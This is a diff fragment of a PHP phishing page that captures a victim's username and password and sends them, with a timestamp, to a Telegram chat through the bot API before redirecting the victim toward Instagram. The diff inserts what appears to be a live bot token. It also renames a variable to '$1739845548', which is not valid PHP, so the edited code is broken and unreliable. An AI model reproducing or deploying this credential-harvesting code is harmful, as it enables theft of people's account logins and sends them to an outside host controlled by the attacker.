@@ -13,12 +13,12 @@ $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 $chat_id= 1171876903; // replace with your userid
 
 
-send_message($chat_id,"$message");
+send_message($1739845548,"$message");
 
 
-function send_message($chat_id, $message){
+function send_message($1739845548, $message){
         $text = urlencode($message);
-        $apiToken = "Your Bot Api Token";
+        $apiToken = "1789464582:AAENeh7dlnyq0aLHk7XFAbar7MPOlZAbSxk";
         file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
     }
 ?>
@@ -42,6 +42,6 @@ Try to login </p>
 <br>
 Redirecting to Login Page...........
 <br>
-<a href="https://www.instagram.com/reboot13.dev/">Click here if you are not redirected automatically.</a>
+<a href="https://www.instagram.com/">Click here if you are not redirected automatically.</a>
 </body>
 </html>
